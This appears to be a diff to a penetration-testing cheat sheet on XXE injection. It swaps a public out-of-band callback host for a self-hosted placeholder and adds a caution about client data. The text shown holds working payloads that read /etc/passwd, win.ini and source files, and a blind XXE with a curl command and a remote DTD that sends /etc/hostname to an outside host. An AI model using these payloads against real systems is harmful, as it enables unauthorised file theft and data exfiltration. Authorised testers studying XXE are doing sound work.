@@ -25,14 +25,17 @@ XML
 Confirm: response echoes `/etc/passwd` contents (`root:x:0:0`). Windows: `file:///c:/windows/win.ini`. Directory listing: `file:///etc/` (Java). Also try `php://filter/convert.base64-encode/resource=...` (PHP, for binary/source), and `http://` to pivot (see §4).
 
 ## 3. Blind / OOB XXE (no reflection)
-Host a DTD on your collaborator, then trigger it:
+`OOB_HOST` is a callback host you control — a self-hosted interactsh or a private Burp Collaborator server. A public server receives whatever the payload exfiltrates, which on an engagement is client data.
+
+Host a DTD on `OOB_HOST`, then trigger it:
+
 ```bash
 # evil.dtd on OOB host:
 # <!ENTITY % f SYSTEM "file:///etc/hostname">
-# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://OOB_ID.oast.pro/?x=%f;'>"> %all;
+# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://OOB_HOST/?x=%f;'>"> %all;
 curl -s https://TARGET/api -H 'Content-Type: application/xml' --data-binary @- <<'XML'
 <?xml version="1.0"?>
-<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://OOB_ID.oast.pro/evil.dtd"> %dtd; ]>
+<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://OOB_HOST/evil.dtd"> %dtd; ]>
 <r>&exfil;</r>
 XML
 ```
